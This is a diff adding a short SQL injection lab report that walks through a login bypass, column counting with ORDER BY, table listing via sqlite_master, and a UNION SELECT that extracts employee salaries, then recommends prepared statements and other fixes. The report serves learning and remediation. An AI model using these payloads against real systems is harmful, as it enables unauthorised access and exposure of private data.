@@ -1,0 +1,63 @@
+===========================================
+SQL Injection Report – S25
+Author: Jasmine
+===========================================
+
+SECTION 1: LOGIN BYPASS
+-------------------------------------------
+Payload I used:
+' OR 1=1 --
+
+What happened:
+This made the login think the condition was always true, so it let me in without a password.
+
+
+SECTION 2: FINDING HOW MANY COLUMNS THERE ARE
+-------------------------------------------
+Tests I tried:
+' ORDER BY 1 --   (worked)
+' ORDER BY 2 --   (worked)
+' ORDER BY 3 --   (error)
+
+Conclusion:
+The query only has 2 columns.
+
+
+SECTION 3: SEEING WHAT TABLES EXIST
+-------------------------------------------
+Payload I used:
+' UNION SELECT name, sql FROM sqlite_master --
+
+What I found:
+There is a table called “employees” with:
+name
+department
+salary
+
+
+SECTION 4: GETTING THE SALARY DATA
+-------------------------------------------
+Payload I used:
+' UNION SELECT name, salary FROM employees --
+
+Expected results:
+Alice | 85000
+Bob   | 92000
+CEO   | 250000
+
+Important part:
+The CEO’s salary is 250000.
+
+
+SECTION 5: HOW TO FIX THIS PROBLEM
+-------------------------------------------
+The website is vulnerable because it puts user input straight into SQL.
+
+Fixes:
+- Use prepared statements
+- Validate input
+- Hide detailed error messages
+- Limit database permissions
+
+Overall:
+The site is vulnerable to SQL injection and lets attackers see private data.
